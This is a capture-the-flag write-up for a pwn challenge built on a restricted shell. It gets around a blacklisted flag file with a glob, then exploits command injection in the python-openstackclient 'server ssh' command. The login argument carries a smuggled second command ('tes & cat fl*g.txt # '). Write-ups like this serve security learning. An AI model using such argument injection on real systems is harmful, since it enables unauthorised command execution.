# pwn | OpenSource as a Service

You are given a pseudo-shell with a restricted set of commands: {ls, cat, openstack}

After doing a `ls` you see:

```bash
$ ls
flag.txt
```

But sadly when trying to launch a `cat` you get:

```bash
$ cat flag.txt
Command failed, I don't like this word
```

And it doesn't seem to be the flag..

After some testing you understand that `flag.txt` is blacklisted and try:

```bash
$ cat fla*.txt
Maybe it's not the real cat.. Maybe you should look somewhere else, idk ¯\_(ツ)_/¯
```

Sadly it seems to be a troll :/

Now you have one last command: `openstack`, obviously you need to exploit it somehow.

After a small grep on their [github repository](https://github.com/openstack/python-openstackclient) you find [this beautiful line](https://github.com/openstack/python-openstackclient/blob/master/openstackclient/compute/v2/server.py#L2093) and decide to exploit it.

First you need to setup an openstack somewhere on your personal server to get access to an existing one. You could also just mock all the openstack requests (setup a fake openstack server).

Once it's done you can do the following:

```bash
$ openstack server list # Choose a server ID with a public address (Ext-Net)
$ openstack server ssh --login "tes & cat fl*g.txt # " --address-type "Ext-Net" --port 22 <SERVER-ID>
```

Note that you will also need to pass some additional parameters for authentication (not listed above for clarity):

```bash
--os-region-name=REGION --os-tenant-name=1711678101234567 --os-tenant-id=a5486cdb71a745b6b4a6864497b5c123 --os-auth-url=https://openstack-auth-url/v2.0/ --os-username=openstack-username --os-password=openstack-password 
```

Please see *exploit/full_exploit.py* for the full automated exploit.
